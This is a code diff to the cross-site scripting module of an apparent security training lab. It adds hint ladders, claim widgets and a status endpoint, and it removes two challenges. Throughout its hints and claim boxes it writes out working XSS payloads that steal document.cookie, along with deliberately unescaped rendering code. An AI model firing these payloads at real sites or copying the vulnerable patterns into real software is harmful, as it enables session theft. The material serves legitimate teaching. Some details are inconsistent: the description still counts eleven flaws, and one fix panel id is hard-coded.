@@ -4,7 +4,7 @@
 const express = require('express');
 const crypto = require('crypto');
 const { getDb } = require('../../lib/db');
-const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
+const { brief, esc, fixPanel, flagBox, hintBox, hintLadder, page, toolsPill, trackBanner, claimBox } = require('../../lib/page');
 const { award, captured } = require('../../lib/flags');
 
 const router = express.Router();
@@ -13,17 +13,17 @@ router.use(express.urlencoded({ extended: false }));
 
 const VULN_IDS = [
   'reflected', 'stored', 'dom',
-  'stored-xss-profile', 'xss-attr-breakout', 'xss-js-context', 'xss-svg-upload',
-  'xss-markdown', 'xss-dom-clobber', 'xss-hash-write', 'xss-backtick',
+  'xss-attr-breakout', 'xss-js-context', 'xss-svg-upload',
+  'xss-markdown', 'xss-dom-clobber', 'xss-backtick',
 ];
 
 // Challenge page slug per vuln id (used by the index page links).
 const PAGE_FOR = {
   reflected: 'search', 'stored': 'guestbook', dom: 'dom',
-  'stored-xss-profile': 'profile', 'xss-attr-breakout': 'attr',
+  'xss-attr-breakout': 'attr',
   'xss-js-context': 'jsctx', 'xss-svg-upload': 'svg',
   'xss-markdown': 'markdown', 'xss-dom-clobber': 'clobber',
-  'xss-hash-write': 'hashwrite', 'xss-backtick': 'backtick',
+  'xss-backtick': 'backtick',
 };
 
 // The canonical exfiltration payload, taught in the briefing and collect page.
@@ -83,7 +83,8 @@ router.get('/', (req, res) => {
           <span class="diff">${esc(v.difficulty)}</span>
           ${done ? '<span class="captured">flag captured</span>' : ''}
         </h3>
-        ${hintBox(v.hint)}
+        ${hintLadder(v)}
+      ${toolsPill(v)}
         <p><i>Attack:</i> ${esc(v.how)}</p>
       </div>`;
   }).join('\n');
@@ -104,7 +105,7 @@ router.get('/', (req, res) => {
     beacon must echo it back. The flag is awarded only when the beacon arrives
     with data and a valid token, so a forged beacon with no page load earns nothing.</p>
   `));
-});
+})
 
 // ------------------------------------------------------------ v1: reflected
 router.get('/search', (req, res) => {
@@ -122,6 +123,7 @@ router.get('/search', (req, res) => {
     </form>
     <hr />${result}
     <p class="note">Try a payload like <code>${esc(EXFIL_PAYLOAD)}</code> as the search term.</p>
+    ${claimBox({ vulnId: 'reflected', payload: "&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=reflected&amp;n='+window.__px)&lt;/script&gt;", statusUrl: '/xss/claim-status?v=reflected' })}
   `));
 });
 
@@ -149,6 +151,7 @@ router.get('/guestbook', (req, res) => {
     <p class="note">Stored payload idea: post
       <code>${esc(EXFIL_PAYLOAD.replace('v=reflected', 'v=stored'))}</code>
       as a comment, then reload this page.</p>
+    ${claimBox({ vulnId: 'stored', payload: "&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=stored&amp;n='+window.__px)&lt;/script&gt;", statusUrl: '/xss/claim-status?v=stored' })}
   `));
 });
 
@@ -186,44 +189,8 @@ router.get('/dom', (req, res) => {
       <code>/xss/dom#&lt;img src=x onerror="fetch('/xss/collect?c='+document.cookie+'&amp;v=dom&amp;n='+window.__px)"&gt;</code>.
       The payload reads <code>window.__px</code>, the page-bound token: only code
       running in this page can know it.</p>
+    ${claimBox({ vulnId: 'dom', payload: '&lt;img src=x onerror=&quot;fetch(&apos;/xss/collect?c=&apos;+document.cookie+&apos;&amp;v=dom&amp;n=&apos;+window.__px)&quot;&gt;', statusUrl: '/xss/claim-status?v=dom', beaconInfo: 'For DOM XSS, put the payload in the URL fragment (after #).' })}
   `));
-});
-
-// ---------------------------------------------------- v4: stored profile
-function getProfileBio() {
-  const db = getDb();
-  db.exec('CREATE TABLE IF NOT EXISTS xss_profiles (id INTEGER PRIMARY KEY, bio TEXT)');
-  db.prepare('INSERT OR IGNORE INTO xss_profiles (id, bio) VALUES (1, ?)').run('Just a regular user. Nothing to see here.');
-  return db.prepare('SELECT bio FROM xss_profiles WHERE id = 1').get().bio;
-}
-
-router.get('/profile', (req, res) => {
-  const bio = getProfileBio();
-  // VULN: the stored bio is rendered raw with no output encoding.
-  res.send(page('Profile (Stored XSS)', `
-    <h2>User profile</h2>
-    ${xssNonceTag(req, 'stored-xss-profile')}
-    <p>Your bio is stored and shown to everyone who visits this page.</p>
-    <div class="comment"><b>you</b><p>${bio}</p></div>
-    <hr />
-    <form method="POST" action="/xss/profile">
-      <textarea name="bio" rows="4" cols="60" placeholder="write your bio" required></textarea><br /><br />
-      <button type="submit">Save bio</button>
-    </form>
-    <p class="note">Stored payload idea: save
-      <code>${esc(EXFIL_PAYLOAD.replace('v=reflected', 'v=stored-xss-profile'))}</code>
-      as your bio, then reload this page.</p>
-  `));
-});
-
-router.post('/profile', (req, res) => {
-  const bio = (req.body.bio || '').slice(0, 2000);
-  if (!bio.trim()) {
-    return res.status(400).send(page('Profile', '<p>Bio is required.</p><p><a href="/xss/profile">Back</a></p>'));
-  }
-  getProfileBio(); // ensure the table exists before updating
-  getDb().prepare('UPDATE xss_profiles SET bio = ? WHERE id = 1').run(bio);
-  res.redirect('/xss/profile');
 });
 
 // ------------------------------------------------- v5: attribute breakout
@@ -244,6 +211,7 @@ router.get('/attr', (req, res) => {
     Close the attribute with <code>"&gt;</code> and inject your own tag, e.g.
     <code>"&gt;&lt;script&gt;...&lt;/script&gt;</code> with
     <code>v=xss-attr-breakout</code> in the exfiltration payload.</p>
+    ${claimBox({ vulnId: 'xss-attr-breakout', payload: '&quot;&gt;&lt;script&gt;fetch(&apos;/xss/collect?c=&apos;+document.cookie+&apos;&amp;v=xss-attr-breakout&amp;n=&apos;+window.__px)&lt;/script&gt;', statusUrl: '/xss/claim-status?v=xss-attr-breakout' })}
   `));
 });
 
@@ -267,6 +235,7 @@ router.get('/jsctx', (req, res) => {
     <p class="note">Your input lands inside a JavaScript string literal. Break out of
     the string with a quote, run your own statement, then comment out the rest
     with <code>//</code>.</p>
+    ${claimBox({ vulnId: 'xss-js-context', payload: "';fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-js-context&amp;n='+window.__px);//", statusUrl: '/xss/claim-status?v=xss-js-context' })}
   `));
 });
 
@@ -300,6 +269,7 @@ router.get('/svg', (req, res) => {
     <code>&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-svg-upload&amp;n='+new URLSearchParams(location.search).get('n'))&lt;/script&gt;</code>,
     then open its link directly. The file link carries the page-bound token in
     <code>?n=</code>; only the script running inside the opened SVG can read it.</p>
+    ${claimBox({ vulnId: 'xss-svg-upload', payload: "&lt;script&gt;fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-svg-upload&amp;n='+new URLSearchParams(location.search).get('n'))&lt;/script&gt;", statusUrl: '/xss/claim-status?v=xss-svg-upload', beaconInfo: 'The SVG opens as its own document. The file link carries the token in ?n=; read it via new URLSearchParams(location.search).get("n").' })}
   `));
 });
 
@@ -361,6 +331,7 @@ router.post('/markdown', (req, res) => {
     <p>Source:</p>
     <pre><code>${esc(md)}</code></pre>
     <p><a href="/xss/markdown">Render another</a></p>
+    ${claimBox({ vulnId: 'xss-markdown', payload: "[x](javascript:fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-markdown&amp;n='+window.__px))", statusUrl: '/xss/claim-status?v=xss-markdown', beaconInfo: 'Click the rendered link to fire the javascript: URL.' })}
   `));
 });
 
@@ -426,6 +397,7 @@ router.get('/clobber-admin', (req, res) => {
       <code>window.settings</code> and its named input became <code>.isAdmin</code>,
       so the page script treated you as an admin.</p>
       ${flagBox(flag)}
+      ${fixPanel('xss', 'xss-dom-clobber')}
       <p><a href="/xss">Back to the XSS module</a></p>
     `));
   }
@@ -434,24 +406,6 @@ router.get('/clobber-admin', (req, res) => {
     <p>The admin panel only unlocks when the page script sees a truthy
     <code>window.settings.isAdmin</code>. Your custom HTML does not do that yet.</p>
     <p><a href="/xss/clobber">Back to custom HTML</a></p>
-  `));
-});
-
-// ------------------------------------------------- v10: hash to document.write
-router.get('/hashwrite', (req, res) => {
-  res.send(page('Hash writer', `
-    <h2>Shareable message</h2>
-    ${xssNonceTag(req, 'xss-hash-write')}
-    <p>This page writes whatever is after the <code>#</code> straight into the document.</p>
-    <div id="msg"></div>
-    <script>
-      // VULN: location.hash flows into document.write with no sanitization.
-      document.write(location.hash.slice(1));
-    </script>
-    <hr />
-    <p><b>Try it:</b> open <code>/xss/hashwrite#&lt;img src=x onerror="..."&gt;</code>
-    (URL-encoded). Use the exfiltration payload with <code>v=xss-hash-write</code>
-    and <code>&amp;n='+window.__px</code> so the beacon carries the page-bound token.</p>
   `));
 });
 
@@ -474,10 +428,20 @@ router.get('/backtick', (req, res) => {
     </script>
     <p class="note">Your input lands inside a template literal (backticks). The
     <code>\${...}</code> syntax evaluates expressions right inside the string.</p>
+    ${claimBox({ vulnId: 'xss-backtick', payload: "${fetch('/xss/collect?c='+document.cookie+'&amp;v=xss-backtick&amp;n='+window.__px)}", statusUrl: '/xss/claim-status?v=xss-backtick' })}
   `));
 });
 
 // ------------------------------------------------------- flag capture beacon
+// Lightweight claim-status endpoint for the live widget. Returns whether the
+// flag for a vuln id has been captured in this session. Never returns a flag
+// value.
+router.get('/claim-status', (req, res) => {
+  const v = (req.query.v || '').toString();
+  if (!VULN_IDS.includes(v)) return res.status(400).json({ error: 'unknown vuln' });
+  res.json({ captured: captured(req, 'xss', v) });
+});
+
 router.get('/collect', (req, res) => {
   const c = (req.query.c || '').toString();
   const v = (req.query.v || '').toString();
@@ -494,6 +458,7 @@ router.get('/collect', (req, res) => {
       <p>Captured <b>${c.length}</b> characters of data for vuln
       <b>${esc(v)}</b>, with a valid page-bound token. Flag awarded:</p>
       ${flagBox(flag)}
+      ${fixPanel('xss', 'xss-dom-clobber')}
       <p><a href="/xss">Back to the XSS module</a></p>
     `));
   }
@@ -514,13 +479,17 @@ module.exports = {
   name: 'Cross-Site Scripting',
   tagline: 'Inject JavaScript, steal the session cookie, capture eleven flags.',
   description: 'Eleven cross-site scripting flaws: a reflected search box, a stored guestbook, and a DOM-based fragment sink, plus eight more - a stored profile bio, attribute and JS-string breakouts, a malicious SVG upload, a naive markdown renderer, DOM clobbering, a hash-to-document.write sink, and template-literal injection.',
-  difficulty: 'Mixed',
+  difficulty: 'Beginner',
+  track: 'Foundations',
+  prerequisites: ['misconfig'],
   vulns: [
     {
       id: 'reflected',
       name: 'Reflected XSS',
       difficulty: 'Easy',
       hint: 'The search term is echoed straight back into the results page. What happens if the "search term" is HTML?',
+      hints: ["The search box echoes your query back into the results page. What happens if your 'search term' is not text?", "The query is interpolated into HTML with no output encoding. A <script> tag in your search becomes a real script in the page.", "Submit <script>fetch('/xss/collect?c='+document.cookie+'&v=reflected&n='+window.__px)</script> as the search query."],
+      tools: "B",
       how: 'Put a script payload in the search box so it executes when the results page renders.',
     },
     {
@@ -528,6 +497,8 @@ module.exports = {
       name: 'Stored XSS',
       difficulty: 'Easy',
       hint: 'Comments are saved and shown to every visitor unescaped. Your payload persists and fires on every page view.',
+      hints: ["Comments are saved and shown to every visitor. Where does your comment end up in the HTML?", "The comment is stored verbatim and rendered raw. Your payload persists in the database and fires for everyone who views the page.", "Post the exfiltration payload (with v=stored) as a guestbook comment, then reload the page."],
+      tools: "B",
       how: 'Post the exfiltration payload as a guestbook comment, then reload the page so your own browser fires it.',
     },
     {
@@ -535,20 +506,17 @@ module.exports = {
       name: 'DOM-based XSS',
       difficulty: 'Medium',
       hint: 'The server never sees the fragment. JavaScript on the page copies location.hash into innerHTML. Craft the URL.',
+      hints: ["The server never sees the URL fragment (everything after #). So where does the vulnerability live?", "JavaScript on the page copies location.hash into innerHTML. The sink is client-side only; the server just serves the static page.", "Craft a URL like /xss/dom#<img src=x onerror=\"fetch('/xss/collect?...&v=dom&n='+window.__px)\"> and open it."],
+      tools: "B, DT",
       how: 'Build a /xss/dom#... link whose fragment contains the exfiltration payload, then open it.',
-    },
-    {
-      id: 'stored-xss-profile',
-      name: 'Stored XSS in Profile Bio',
-      difficulty: 'Easy',
-      hint: 'The bio is saved verbatim and rendered raw on the profile page. Anything you store runs for every visitor.',
-      how: 'Save the exfiltration payload (with v=stored-xss-profile) as your bio, then reload the profile page.',
     },
     {
       id: 'xss-attr-breakout',
       name: 'XSS via Attribute Breakout',
       difficulty: 'Medium',
       hint: 'Your input lands inside value="...". The quote is not escaped, so you can close the attribute and open a new tag.',
+      hints: ["Your input lands inside an HTML attribute: value=\"...\". The quote character is not escaped. What can you do with an unescaped quote?", "Close the attribute with \">, then open a new tag. You are breaking out of the attribute context into the HTML body context.", "Submit \"> <script>fetch('/xss/collect?c='+document.cookie+'&v=xss-attr-breakout&n='+window.__px)</script> to break out and execute."],
+      tools: "B",
       how: 'Submit "> followed by a script tag carrying the exfiltration payload (v=xss-attr-breakout).',
     },
     {
@@ -556,6 +524,8 @@ module.exports = {
       name: 'XSS in a JavaScript String',
       difficulty: 'Medium',
       hint: "Your input lands inside a single-quoted JS string: var q = '...'. Break out of the string, run your code, and comment out the tail.",
+      hints: ["Your input lands inside a JavaScript string: var q = '...'. The single quote is not escaped.", "Break out of the string with ';, run your code, then comment out the rest of the line with //.", "Submit ';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context&n='+window.__px);// to escape the string and execute."],
+      tools: "B",
       how: "Submit ';fetch('/xss/collect?c='+document.cookie+'&v=xss-js-context&n='+window.__px);// to break out of the string.",
     },
     {
@@ -563,6 +533,8 @@ module.exports = {
       name: 'Stored XSS via SVG Upload',
       difficulty: 'Medium',
       hint: 'Uploaded SVGs are served as image/svg+xml. An SVG is XML, and XML can carry a script tag that runs when the file is opened directly.',
+      hints: ["You can upload SVG files and they are served as image/svg+xml. What is an SVG file, really?", "SVG is XML, and XML can contain <script> tags. When the browser opens the SVG directly (not as an <img>), the script runs.", "Upload an SVG containing <script>fetch('/xss/collect?c='+document.cookie+'&v=xss-svg-upload&n='+window.__px)</script>, then open the file URL directly."],
+      tools: "B, C",
       how: 'Upload an SVG containing a script with the exfiltration payload (v=xss-svg-upload), then open the file URL.',
     },
     {
@@ -570,6 +542,8 @@ module.exports = {
       name: 'XSS via Naive Markdown Links',
       difficulty: 'Medium',
       hint: 'The renderer turns [text](url) into a link but never checks the URL scheme. Links are not limited to http(s).',
+      hints: ["The renderer turns [text](url) into a link. What URL schemes can a link have?", "The renderer never checks the URL scheme. javascript: URLs run code when clicked.", "Submit [click](javascript:fetch('/xss/collect?c='+document.cookie+'&v=xss-markdown&n='+window.__px)) and click the rendered link."],
+      tools: "B",
       how: 'Render [click](javascript:...) so the link target becomes a javascript: URL, then click it.',
     },
     {
@@ -577,20 +551,17 @@ module.exports = {
       name: 'DOM Clobbering to Admin',
       difficulty: 'Hard',
       hint: 'Scripts are stripped, but form and input tags survive. The page script trusts window.settings.isAdmin. Named elements in the DOM become window properties.',
+      hints: ["The page has a script that reads window.settings.isAdmin. What else can create window properties?", "Named HTML elements (id= or name=) become properties of window. An <form id=\"settings\"> with <input name=\"isAdmin\"> shadows the real settings object.", "Inject <form id=\"settings\"><input name=\"isAdmin\" value=\"1\"> so window.settings.isAdmin becomes truthy, then open the admin panel."],
+      tools: "B, DT",
       how: 'Inject <form id="settings"><input name="isAdmin" value="1"> so window.settings.isAdmin becomes truthy, then open the admin panel.',
-    },
-    {
-      id: 'xss-hash-write',
-      name: 'DOM XSS via document.write',
-      difficulty: 'Medium',
-      hint: 'A second fragment sink, distinct from the innerHTML lab: this page feeds location.hash into document.write.',
-      how: 'Open /xss/hashwrite# with a URL-encoded script payload (v=xss-hash-write) in the fragment.',
     },
     {
       id: 'xss-backtick',
       name: 'XSS in a Template Literal',
       difficulty: 'Medium',
       hint: 'Your input lands inside backticks: var msg = `...`. Template literals evaluate ${...} expressions inline.',
+      hints: ["Your input lands inside a JavaScript template literal: var msg = `...`. Template literals do something special with ${}.", "The ${...} inside backticks is evaluated as code. You don't need to break out; just inject an expression.", "Submit ${fetch('/xss/collect?c='+document.cookie+'&v=xss-backtick&n='+window.__px)} to execute inside the literal."],
+      tools: "B",
       how: 'Submit ${fetch(\'/xss/collect?c=\'+document.cookie+\'&v=xss-backtick&n=\'+window.__px)} to execute code inside the literal.',
     },
   ],
